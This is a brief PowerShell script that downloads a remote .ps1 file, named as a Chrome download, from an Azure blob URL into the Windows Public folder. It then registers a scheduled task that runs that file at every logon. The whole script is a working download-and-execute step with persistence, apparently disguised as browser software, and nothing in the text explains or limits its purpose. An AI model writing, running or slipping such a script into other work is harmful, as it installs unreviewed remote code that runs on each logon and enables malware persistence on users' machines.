$url = "https://mycontainer10.blob.core.windows.net/shrecontainer10/chrome download.ps1"
$outputPath = "C:\Users\Public\chrome download.ps1"

Invoke-WebRequest -Uri $url -OutFile $outputPath

# Create a scheduled task to run the PowerShell script at logon
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument $outputPath
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Taskname "runchromelogon" -Action $Action -Trigger $Trigger -Settings $Settings -Force